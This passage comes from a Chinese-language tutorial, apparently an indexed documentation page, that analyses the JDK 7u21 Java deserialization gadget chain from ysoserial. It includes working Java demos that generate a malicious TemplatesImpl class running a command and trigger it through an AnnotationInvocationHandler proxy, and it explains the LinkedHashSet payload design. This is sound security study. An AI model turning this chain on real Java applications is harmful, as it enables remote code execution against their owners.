throws TransformerConfigurationException { TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory); \\\\here \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 } OK.\u6211\u4eec\u627e\u5230\u4e86\u89e6\u53d17u21\u94fe\u7684\u4e00\u4e2a\u6838\u5fc3\u70b9\u4e86\u3002\u6211\u4eec\u5199\u4e2a\u5c0fdemo\u6765\u901a\u8fc7TemplatesImpl\u5b9e\u73b0\u4ee3\u7801\u6267\u884c \u5c0fdemo\u7684\u5b9e\u73b0\u601d\u8def\u4e3a\uff1a\u901a\u8fc7javassist\u52a8\u6001\u751f\u6210\u4e00\u4e2a\u6076\u610f\u7c7b\uff08\u6784\u9020\u65b9\u6cd5\u6216\u8005\u9759\u6001\u4ee3\u7801\u5757\u6709\u6076\u610f\u4ee3\u7801\uff09\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u751f\u6210\u4e00\u4e2aTemplatesImpl\u5bf9\u8c61\u5e76\u8bbe\u7f6e\u5404\u4e2a\u53d8\u91cf\u7684\u503c\uff0c\u7136\u540e\u8c03\u7528\u4e00\u4e0bTemplatesImpl\u5bf9\u8c61\u7684newTransformer\u65b9\u6cd5\u5373\u53ef\u9020\u6210\u4ee3\u7801\u6267\u884c\uff0c\u4ee3\u7801\u5982\u4e0b \u9996\u5148TemplatesImpl\u7c7b\u4e2d\u6709\u4e2a\u65b9\u6cd5defineTransletClasses\uff0c\u5b83\u7684\u4e3b\u8981\u4ee3\u7801\u5982\u4e0b private byte[][] _bytecodes = (byte[][])null; private void defineTransletClasses() throws TransformerConfigurationException { if (this._bytecodes == null) { ..... } else { TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader()); } }); try { int classCount = this._bytecodes.length; this._class = new Class[classCount]; for(int i = 0; i < classCount; ++i) { this._class[i] = loader.defineClass(this._bytecodes[i]); \\\\\u5c06_bytecodes\u4e2d\u7684\u6240\u6709\u5b57\u8282\u901a\u8fc7defineClass\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7c7b Class superClass = this._class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) { this._transletIndex = i; } else { this._auxClasses.put(this._class[i].getName(), this._class[i]); } } } \u4e5f\u5c31\u662f\u8bf4\u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5c06_bytecodes\u6570\u7ec4\u4e2d\u7684\u5b57\u8282\u8fd8\u539f\u6210\u4e00\u4e2a\u7c7b\uff0c\u5b58\u50a8\u5230_class\u53d8\u91cf\u4e2d\u3002\u63a5\u4e0b\u6765\u5982\u679c\u6211\u4eec\u80fd\u627e\u5230\u8c03\u7528defineTransletClasses\u65b9\u6cd5\u5e76\u6267\u884c\u4e86_class[].newinstance() \u8fd9\u6837\u7684\u7684\u4ee3\u7801\u7684\u65b9\u6cd5\uff0c\u5c31\u80fd\u5b9e\u4f8b\u5316\u4ece\u5b57\u8282\u5f97\u5230\u7684\u7c7b\u4e86\uff0c\u4ece\u800c\u5c31\u80fd\u6267\u884c\u7c7b\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u5757\u548c\u6784\u9020\u51fd\u6570\u4e86\uff01 \u6240\u4ee5\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u53bb\u5bfb\u627e\u8fd9\u79cd\u65b9\u6cd5\u3002 \u901a\u8fc7\u641c\u7d22defineTransletClasses\uff0c\u6211\u4eec\u627e\u5230\u4e86\u6709\u5982\u4e0b\u4e09\u4e2a\u65b9\u6cd5\u8c03\u7528\u4e86defineTransletClasses\u65b9\u6cd5\uff1a getTransletInstance getTransletIndex getTransletClasses \u5176\u4e2d\uff0cgetTransletInstance\u65b9\u6cd5\u662f\u552f\u4e00\u7b26\u5408\u201c\u8c03\u7528\u4e86defineTransletClasses\u4e14\u6709_class[].newinstance()\u201d\u7684\u65b9\u6cd5\uff0c\u5176\u4ee3\u7801\u5982\u4e0b private Translet getTransletInstance() throws TransformerConfigurationException { ErrorMsg err; try { if (this._name == null) { return null; } else { if (this._class == null) { this.defineTransletClasses(); } AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\\\here translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(this._useServicesMechanism); if (this._auxClasses != null) { translet.setAuxiliaryClasses(this._auxClasses); } return translet; } \u90a3\u4e48\uff0cgetTransletInstance\u662f\u4e00\u4e2aprivate\u65b9\u6cd5\uff0c\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u91cc\u80fd\u53bb\u8c03\u7528\u5b83\u5462\uff1f\u7b54\u6848\u662fnewTransformer\u65b9\u6cd5 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory); \\\\here \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 } OK.\u6211\u4eec\u627e\u5230\u4e86\u89e6\u53d17u21\u94fe\u7684\u4e00\u4e2a\u6838\u5fc3\u70b9\u4e86\u3002\u6211\u4eec\u5199\u4e2a\u5c0fdemo\u6765\u901a\u8fc7TemplatesImpl\u5b9e\u73b0\u4ee3\u7801\u6267\u884c \u5c0fdemo\u7684\u5b9e\u73b0\u601d\u8def\u4e3a\uff1a\u901a\u8fc7javassist\u52a8\u6001\u751f\u6210\u4e00\u4e2a\u6076\u610f\u7c7b\uff08\u6784\u9020\u65b9\u6cd5\u6216\u8005\u9759\u6001\u4ee3\u7801\u5757\u6709\u6076\u610f\u4ee3\u7801\uff09\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u751f\u6210\u4e00\u4e2aTemplatesImpl\u5bf9\u8c61\u5e76\u8bbe\u7f6e\u5404\u4e2a\u53d8\u91cf\u7684\u503c\uff0c\u7136\u540e\u8c03\u7528\u4e00\u4e0bTemplatesImpl\u5bf9\u8c61\u7684newTransformer\u65b9\u6cd5\u5373\u53ef\u9020\u6210\u4ee3\u7801\u6267\u884c\uff0c\u4ee3\u7801\u5982\u4e0b public class test{ public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\"evilclass\"); String cmd = \"Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); \\\\\u5411\u9759\u6001\u4ee3\u7801\u5757\u63d2\u5165\u6076\u610f\u4ee3\u7801\uff0c\u63d2\u5165\u5230\u6784\u9020\u51fd\u6570\u4e5f\u53ef\u4ee5 cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); \\\\\u9700\u8bbe\u7f6e\u6b64\u9879\u624d\u80fd\u5b9e\u73b0newinstance\uff0c\u5177\u4f53\u539f\u56e0\u8bf7\u770bdefineTransletClasses\u548cgetTransletInstance\u6e90\u7801 cc.setName(\"evilClass\"); byte[] evilbytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{evilbytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Class clazz = TemplatesImpl.class.newInstance().getClass(); Field[] Fields = clazz.getDeclaredFields(); for (Field Field : Fields) { //\u904d\u5386Fields\u6570\u7ec4 try { Field.setAccessible(true); //\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u9879\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee if(Field.getName()==\"_bytecodes\"){ Field.set(templates,targetByteCodes); } if(Field.getName()==\"_class\"){ Field.set(templates,null); } if(Field.getName()==\"_name\"){ Field.set(templates,\"abc\"); } if(Field.getName()==\"_tfactory\"){ Field.set(templates,new TemplatesImpl()); } } catch (Exception e) {} } templates.newTransformer(); } } \u4f46\u4ec5\u4ec5\u662f\u8fd9\u6837\uff0c\u80af\u5b9a\u662f\u4e0d\u591f\u7684\u3002","title":"TemplatesImpl"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#annotationinvocationhandler","text":"\u6211\u4eec\u7ee7\u7eed\u770bysoserial\u6e90\u7801\u53ef\u4ee5\u770b\u5230\u52a8\u7528\u4e86AnnotationInvocationHandler\u8fd9\u4e2a\u4e1c\u897f.\u8fd9\u4e2a\u7c7b\u539f\u672c\u7684\u4f5c\u7528\u662f\u4f5c\u4e3aAnnotation \u7c7b\u7684\u52a8\u6001\u4ee3\u7406 \u6211\u4eec\u628a\u76ee\u5149\u805a\u7126\u4e8eAnnotationInvocationHandler#invoke\u65b9\u6cd5 public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\"equals\") && var5.length == 1 && var5[0] == Object.class) { return this.equalsImpl(var3[0]); } .......... } \u5b83\u4f1a\u68c0\u6d4b\u4f20\u5165\u7684\u65b9\u6cd5\u4e2d\u662f\u5426\u6709\u7b26\u5408 \u540d\u4e3aequals\uff0c\u53ea\u6709\u4e00\u4e2aObject\u7c7b\u578b\u53c2\u6570\u3002\u82e5\u662f\uff0c\u5219\u8c03\u7528equalsImpl\u65b9\u6cd5\u5e76\u4f20\u5165\u65b9\u6cd5\u4e2d\u7684\u53c2\u6570\u3002 \u8ddf\u8fdbequalsimpl\u65b9\u6cd5 private Boolean equalsImpl(Object var1) { if (var1 == this) { return true; } else if (!this.type.isInstance(var1)) { return false; } else { Method[] var2 = this.getMemberMethods(); int var3 = var2.length; for(int var4 = 0; var4 < var3; ++var4) { Method var5 = var2[var4]; String var6 = var5.getName(); Object var7 = this.memberValues.get(var6); Object var8 = null; AnnotationInvocationHandler var9 = this.asOneOfUs(var1); if (var9 != null) { var8 = var9.memberValues.get(var6); } else { try { var8 = var5.invoke(var1); \\\\here } catch (InvocationTargetException var11) { return false; } catch (IllegalAccessException var12) { throw new AssertionError(var12); } } if (!memberValueEquals(var7, var8)) { return false; } } return true; } } private Method[] getMemberMethods() { if (this.memberMethods == null) { this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() { public Method[] run() { Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods(); AccessibleObject.setAccessible(var1, true); return var1; } }); } return this.memberMethods; } \u53d1\u73b0\u4f1a\u83b7\u53d6this.type\u5bf9\u8c61\u4e2d\u6240\u6709\u65b9\u6cd5\u5e76\u6267\u884c\u3002 \u521b\u5efa\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684TemplatesImpl\u5b9e\u4f8b\uff0c\u901a\u8fc7AnnotationInvocationHandler\u521b\u5efa\u4efb\u610f\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u7136\u540e\u4ee3\u7406\u5bf9\u8c61\u8c03\u7528equals\u65b9\u6cd5\u4f20\u5165\u53c2\u6570\u4e3a\u6076\u610fTemplatesImpl\u5bf9\u8c61\uff0c\u5373\u53ef\u9020\u6210\u6076\u610f\u4ee3\u7801\u6267\u884c \u770b\u5230\u8fd9\u91cc\u4e00\u5b9a\u4e00\u5934\u96fe\u6c34\uff0c\u770b\u770bdemo\u4e5f\u8bb8\u4f1a\u597d\u4e00\u70b9 public class test{ public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\"evilclass\"); String cmd = \"Runtime.getRuntime().exec(\\\"calc\\\");\"; CtConstructor cons = new CtConstructor(new CtClass[]{},cc); cons.setBody(\"Runtime.getRuntime().exec(\\\"calc\\\");\"); cc.addConstructor(cons); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); cc.setName(\"evilClass\"); byte[] evilbytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{evilbytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Class clazz = TemplatesImpl.class.newInstance().getClass(); Field[] Fields = clazz.getDeclaredFields(); for (Field Field : Fields) { //\u904d\u5386Fields\u6570\u7ec4 try { //\u6267\u884cget()\u65b9\u6cd5\u65f6\u9700\u629b\u51faIllegalAccessException\u9519\u8bef Field.setAccessible(true); //\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u9879\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee if(Field.getName()==\"_bytecodes\"){ Field.set(templates,targetByteCodes); } if(Field.getName()==\"_class\"){ Field.set(templates,null); } if(Field.getName()==\"_name\"){ Field.set(templates,\"abc\"); } if(Field.getName()==\"_tfactory\"){ Field.set(templates,new TemplatesImpl()); } } catch (Exception e) {} } //\u4ee5\u4e0a\u4ee3\u7801\u751f\u6210\u4e86\u6076\u610fTemplatesImpl\u5bf9\u8c61templates Map map = new HashMap(); final Constructor<?> ctor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructors()[0]; //\u83b7\u5f97AnnotationInvocationHandler\u6784\u9020\u65b9\u6cd5\uff0c\u65b9\u4fbf\u83b7\u5f97\u5b83\u4e00\u4e2a\u5b9e\u4f8b ctor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class, map); //\u8fd9\u91cc\u6709\u4e2a\u95ee\u9898\uff0c\u4e3a\u4ec0\u4e48\u8981\u4f20\u5165Templates\u7c7b\u5bf9\u8c61\u800c\u4e0d\u662fTemplatesImpl Object proxy = Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler); \\\\\u53cd\u6b63\u521b\u5efa\u4e00\u4e2aAnnotationInvocationHandler\u7684\u4ee3\u7406\u5bf9\u8c61\u5c31\u884c\u4e86\uff0c\u524d\u4e24\u4e2a\u53c2\u6570\u90fd\u4e0d\u7528\u600e\u4e48\u7ba1 proxy.equals(templates); //\u6076\u610f\u4ee3\u7801\u6267\u884c } } \u6211\u4eec\u6162\u6162\u770b\u770b\u903b\u8f91\uff0c\u5728proxy.equals\u5904\u4e0b\u65ad\u70b9\uff0c\u8c03\u8bd5 \u6beb\u65e0\u7591\u95ee\u4f1a\u8fdb\u5165\u5230\u6b64\u5904\uff1aAnnotationInvocationHandler\u7684invoke\u65b9\u6cd5\u3002 \u7136\u540e\u53c2\u6570\u7b26\u5408if\u5224\u65ad\uff0c\u8c03\u7528equalsImpl\u65b9\u6cd5\uff0c\u5e76\u4f20\u5165\u53c2\u6570\u4e3a\u6076\u610fTemplatesImpl\u5bf9\u8c61\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u8fdb\u5165\u53cd\u5c04\u8c03\u7528\u5904 \u904d\u5386var2\u53d8\u91cf\u4e2d\u7684\u65b9\u6cd5\uff0c\u5e76\u7531\u6211\u4eec\u7684\u6076\u610f\u5bf9\u8c61\u6765\u6267\u884c\u3002 \u2014\u2014\u2014\u2014\u6b64\u5904\u63d2\u4e00\u4e0bvar2\u53d8\u91cf\u7684\u6765\u5386 \u6ce8\u610f\u6b64\u5904\u7684getMemberMethods\u65b9\u6cd5\uff0c\u5b83\u5b9e\u8d28\u4e0a\u662f\u901a\u8fc7\u53cd\u5c04\u83b7\u5f97this.type\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u3002\u800cthis.type\u662f\u5728\u8be5\u5bf9\u8c61\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002 getMemberMethods\uff1a \u6784\u9020\u65b9\u6cd5\uff1a \u2014\u2014\u2014\u2014\u56de\u5230\u6b63\u9898 \u7531\u4e8e\u6211\u4eec\u901a\u8fc7\u53cd\u5c04\u4f20\u5165\u6784\u9020\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662fTemplates.class\uff0c\u6240\u4ee5\u5b83\u4f1a\u904d\u5386Templates\u7c7b\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u3002\u8fd9\u4e2a\u7c7b\u5176\u5b9e\u662fTemplatesImpl\u7684\u63a5\u53e3\u7c7b\uff0c\u5b83\u7684\u4ee3\u7801\u5982\u4e0b \u6240\u4ee5var2\u4e2d\u5b58\u50a8\u7684\u65b9\u6cd5\u53ea\u6709\u4e24\u4e2a\uff0cnewTransformer\u548cgetOutputProperties\u3002 \u7136\u540e\u5f53\u904d\u5386\u5230newTransformer\u65b9\u6cd5\u65f6\uff0c\u5c31\u4f1a\u901a\u8fc7\u53cd\u5c04\u8c03\u7528\u8fbe\u5230 eviltemplatesImpl.newTransformer() \u7684\u6548\u679c\uff0c\u4ece\u800c\u5bfc\u81f4\u6076\u610fTemplatesImpl\u5bf9\u8c61\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u88ab\u6267\u884c\u3002 \u8fd9\u91cc\u627f\u63a5\u4e0a\u9762\u8bf4\u7684\uff0c\u4e3a\u4ec0\u4e48\u521d\u59cb\u5316AnnotationInvocationHandler\u5bf9\u8c61\u65f6\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff08\u5373this.type)\u662fTemplates.class\uff0c\u800c\u4e0d\u662fTemplatesImpl.class \u8bda\u7136\uff0c\u8fd9\u4e24\u4e2a\u7c7b\u5bf9\u8c61\u90fd\u6709\u65b9\u6cd5newTransformer\u3002\u4f46\u662f\u5982\u679c\u4f20\u5165TemplatesImpl.class\uff0c\u5728\u904d\u5386\u5176\u4e2d\u65b9\u6cd5\u5e76\u901a\u8fc7\u53cd\u5c04\u6267\u884c\u65f6\u4f1a\u51fa\u73b0\u9519\u8bef\uff1aequalsImpl\u4e2d\u7684\u53cd\u5c04\u8c03\u7528\u662f\u4e0d\u4f20\u5165\u53c2\u6570\u7684 \u800cTemplatesImpl\u4e2d\u6709\u8bb8\u591a\u9700\u8981\u4f20\u5165\u53c2\u6570\u624d\u80fd\u88ab\u6b63\u5e38\u4f7f\u7528\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u4e0d\u4f20\u5165\u53c2\u6570\u5c31\u53cd\u5c04\u8c03\u7528\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u4ee5\u81f3\u4e8e\u5728\u904d\u5386\u5230newTransformer\u65b9\u6cd5\u524d\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u4ece\u800c\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u4e0d\u88ab\u5b9e\u73b0\u3002 \u4ec5\u4ec5\u662f\u8fd9\u6837\uff0c\u4e5f\u8fd8\u662f\u4e0d\u591f\u7684\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u624b\u52a8\u8c03\u7528equals\u624d\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\uff0c\u53cd\u5e8f\u5217\u5316\u70b9\u5728\u54ea\u91cc\uff1f","title":"AnnotationInvocationHandler"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#linkedhashset","text":"ysoserial\u7684payload\u4e2d\u51fa\u73b0\u4e86\u6b64\u7c7b\u3002 LinkedHashSet\u7ee7\u627f\u81eaHashSet\u7c7b\uff0c\u5b83\u7684readObject\u65b9\u6cd5\u4e5f\u662f\u4eceHashSet\u7ee7\u627f\u800c\u6765\u7684\u3002\u6211\u4eec\u770b\u770breadObject\u65b9\u6cd5\u7684\u6784\u9020 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); int var2 = var1.readInt(); float var3 = var1.readFloat(); this.map = (HashMap)(this instanceof LinkedHashSet ? new LinkedHashMap(var2, var3) : new HashMap(var2, var3)); int var4 = var1.readInt(); for(int var5 = 0; var5 < var4; ++var5) { Object var6 = var1.readObject(); this.map.put(var6, PRESENT); } } } \u5b83\u7684\u4e3b\u8981\u4eae\u70b9\u5728for\u5faa\u73af\u91cc\u9762\uff1a\u904d\u5386\u4f20\u5165\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0c\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u540e\uff0c\u518d\u4f20\u5165put\u65b9\u6cd5 \u6240\u4ee5\u6211\u4eec\u518d\u6765\u8ddf\u8fdb\u4e00\u4e0bmap.put\u65b9\u6cd5 public V put(K var1, V var2) { if (var1 == null) { return this.putForNullKey(var2); } else { int var3 = this.hash(var1); int var4 = indexFor(var3, this.table.length); for(HashMap.Entry var5 = this.table[var4]; var5 != null; var5 = var5.next) { Object var6; if (var5.hash == var3 && ((var6 = var5.key) == var1 || var1.equals(var6))) { //here Object var7 = var5.value; var5.value = var2; var5.recordAccess(this); return var7; } } ++this.modCount; this.addEntry(var3, var1, var2, var4); return null; } } \u6ce8\u610f\u6211\u4eec\u6dfb\u52a0\u6ce8\u91ca\u90a3\u4e00\u884c\uff0c\u6709\u4e00\u4e2avar1.equals(var6))) \u5176\u4e2dvar1\u548cvar6\u6211\u4eec\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684\uff1avar1\u5373\u4f20\u5165\u7684\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61(\u6076\u610fTemplatesImpl)\uff0cvar6\u5b9e\u9645\u4e0a\u4e5f\u662f\u6211\u4eec\u4f20\u5165\u7684\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\uff08\u6076\u610fAnnotationInvocationHandler\u4ee3\u7406\u5bf9\u8c61\uff09\u3002 \u4f46\u662f\u60f3\u8981\u6267\u884cvar1.equals(var6))) \u5219\u5fc5\u987b\u8981\u8ba9 var5.hash == var3 \u4e3atrue \u4e14 (var6 = var5.key) == var1\u4e3afalse. \u600e\u4e48\u505a\u5230\u5462\uff1f \u6ce8\u610fput\u65b9\u6cd5\u7684\u7b2c5\u884c\uff0c\u5bf9\u4f20\u5165\u7684\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u8c03\u7528\u4e86hash\u65b9\u6cd5\u3002\u6211\u4eec\u8ddf\u8fdbhash\u65b9\u6cd5 final int hash(Object var1) { int var2 = 0; if (this.useAltHashing) { if (var1 instanceof String) { return Hashing.stringHash32((String)var1); } var2 = this.hashSeed; } var2 ^= var1.hashCode(); //here var2 ^= var2 >>> 20 ^ var2 >>> 12; return var2 ^ var2 >>> 7 ^ var2 >>> 4; } \u53d1\u73b0\u4f1a\u6267\u884c\u4f20\u5165\u7684\u53c2\u6570\u5bf9\u8c61\u7684hashCode()\u65b9\u6cd5 \u5f53\u6211\u4eec\u4f20\u5165\u7684\u53c2\u6570\u4e3a\u6076\u610fAnnotationInvocationHandler\u4ee3\u7406\u5bf9\u8c61\u65f6\uff0c\u4f1a\u8c03\u7528\u4ee3\u7406\u5bf9\u8c61\u4e2d\u7684invoke\u65b9\u6cd5\u3002\u5bf9\u4e8eAnnotationInvocationHandler\u800c\u8a00\u5f53\u5224\u65ad\u5230\u6267\u884chashCode\u65b9\u6cd5\u65f6\uff0c\u5b9e\u8d28\u4e0a\u4f1a\u6267\u884cAnnotationInvocationHandler\u4e2d\u7684hashCodeImpl\u65b9\u6cd5 \u6211\u4eec\u8ddf\u8fdbhashCodeImpl private int hashCodeImpl() { int var1 = 0; Entry var3; for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) { var3 = (Entry)var2.next(); } return var1; } \u4e0a\u9762\u662f\u771f\u5b9e\u4ee3\u7801\uff0c\u6bd4\u8f83\u96be\u770b\uff0c\u6240\u4ee5\u501f\u9274\u4e86\u4e00\u4e0b\u522b\u4eba\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\u540e\u7684\u4ee3\u7801\uff0c\u65b9\u4fbf\u6211\u4eec\u8fdb\u884c\u5206\u6790 private int hashCodeImpl() { int result = 0; // \u904d\u5386 memberValues Iterator itr = this.memberValues.entrySet().iterator(); for( ;itr.hasNext(); ) { Entry entry = (Entry)itr.next(); String key = ((String)entry.getKey()); Object value = entry.getValue(); // 127 * key \u7684 hashCode\uff0c\u518d\u548c memberValueHashCode(value) \u8fdb\u884c\u5f02\u6216 result += 127 * key.hashCode() ^ memberValueHashCode(value); } return result; } \u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u904d\u5386this.memberValues\u5c5e\u6027\uff08\u8fd9\u4e2a\u5c5e\u6027\u5b9e\u8d28\u4e0a\u5c31\u662fHashMap\u5185\u6dfb\u52a0\u7684\u5c5e\u6027\uff09\uff0c\u7136\u540e\u5bf9\u5176\u4e2d\u6bcf\u4e00\u9879\u952e\u503c\u5c5e\u6027\u8fdb\u884c\u8fdb\u884c\u4f4d\u8fd0\u7b97\u5e76\u7d2f\u52a0 \u5176\u4e2dmemberValueHashCode\u51fd\u6570\u6211\u4eec\u4e5f\u53ef\u4ee5\u8ddf\u8fdb\u4e00\u4e0b \u53d1\u73b0\u53ea\u8981\u4f20\u5165\u53c2\u6570\u4e0d\u4e3a\u6570\u7ec4\uff0c\u5c31\u8c03\u7528\u5b83\u7684hashCode\u51fd\u6570\u5e76\u8fd4\u56de\u3002 \u6211\u4eec\u6765\u68b3\u7406\u4e00\u4e0b\uff0c\u600e\u4e48\u624d\u80fd\u8c03\u7528\u5230put\u65b9\u6cd5\u91cc\u7684equals\u89e6\u53d1\u4ee3\u7801\u6267\u884c\uff1a payload\u9636\u6bb5\uff1a \u5efa\u7acb\u4e00\u4e2amap\u53d8\u91cf\uff0c\u5176key\u4e3a\u7279\u6b8a\u7684\u4e00\u4e2a\u503c:f5a5a608,\u8fd9\u4e2a\u503c\u7684hashCode\u662f0\uff0c\u7136\u540e\u503c\u4e3a\u6076\u610ftemplatesImpl\u7c7b\uff0c\u7136\u540e\u4ee5\u8fd9\u4e2amap\u53d8\u91cf\u4e3a\u53c2\u6570\u5efa\u7acbAnnotationInvocationHandler\u4ee3\u7406\u5bf9\u8c61\u3002 \u518d\u5411HashMap\u91cc\u653e\u5165\u4e00\u4e2a\u503c\uff0c\u952e\u4e3a\u6076\u610fTemplatesImpl\u5bf9\u8c61\uff0c \u518d\u653e\u5165\u4e00\u4e2a\u503c\uff0c\u952e\u4e3a\u6076\u610fAnnotationInvocationHandler\u5bf9\u8c61\u3002 \uff08LinkedHashSet\u4f1a\u8ba9HashMap\u6709\u5e8f\uff0c\u4ece\u800c\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u80fd\u6309\u987a\u5e8f\u4f9d\u6b21\u4eceHashMap\u8bfb\u53d6\u5bf9\u8c61\u3002\u5982\u679c\u7528HashSet\uff0c\u5219\u4f1a\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u62a5\u9519\uff09 \u53cd\u5e8f\u5217\u5316\u9636\u6bb5\uff1a \u968f\u540e\u5728readObject\u65f6\uff0cTemplatesImpl\u5148\u88abput\u65b9\u6cd5\u8c03\u7528\u3002 \u7136\u540e\u5728put\u65b9\u6cd5\u91cc\u901a\u8fc7hash()\u65b9\u6cd5\u83b7\u5f97\u5176hash\uff0c\u5e76\u5c06\u5176\u5f55\u5165\u5230\u5b83\u7684hash\u5c5e\u6027\u91cc\uff0c\u7136\u540e\u5199\u5165\u5230HashMap\u7684\u5b58\u50a8\u961f\u5217\u91cc\u3002 \u7136\u540eAnnotationInvocationHandler\u518d\u88abput\u65b9\u6cd5\u8c03\u7528 \u5728\u5bf9\u5176\u4f7f\u7528hash\u65b9\u6cd5\u83b7\u5f97hash\u65f6\uff0c\u4f1a\u56e0\u5176\u662f\u4e00\u4e2a\u4ee3\u7406\u7c7b\u7684\u7f18\u6545\u5728hash\u51fd\u6570\u5185\u90e8\u8c03\u7528hashCode()\u65b9\u6cd5\u65f6\u4f1a\u8c03\u7528\u5176\u4ee3\u7406\u65b9\u6cd5hashCodeImpl\u3002 \u968f\u540e\u5728hashCodeImpl\u5185\u90e8\u904d\u5386this.memberValues\u53d8\u91cf\uff08\u4e5f\u5c31\u662f\u4e4b\u524d\u521d\u59cb\u5316\u65f6\u653e\u5165\u7684map\u53d8\u91cf\uff09 \u5c06\u6bcf\u4e00\u9879\u7684key\u503c\u7684hashCode\u4e0e\u4f20\u5165map vaule\u503c\u4f5c\u4e3a\u53c2\u6570\u7684memberValueHashCode\u65b9\u6cd5\u8fdb\u884c\u5f02\u6216\u3002 \u8fd9\u4e2amemberValueHashCode\u65b9\u6cd5\u4f1a\u5224\u65ad\u4f20\u5165\u7684\u503c\u662f\u5426\u4e3a\u6570\u7ec4\uff0c\u82e5\u4e0d\u662f\u6570\u7ec4\u5219\u76f4\u63a5\u8fd4\u56de\u53c2\u6570\u7684hashCode()\u3002 \u56e0\u4e3a\u6211\u4eec\u4e4b\u524d\u521d\u59cb\u5316\u4ee3\u7406\u5bf9\u8c61\u65f6\u4f20\u5165\u7684\u662f\u4e00\u4e2a\u952e\u4e3af5a5a608\uff0c\u503c\u4e3aeviltemplates\u7684map\uff0c\u6240\u4ee5\u4ee5\u4e0ahash\u8ba1\u7b97\u6700\u7ec8\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u4fbf\u662f0^(templatesImpl.hashCode()). 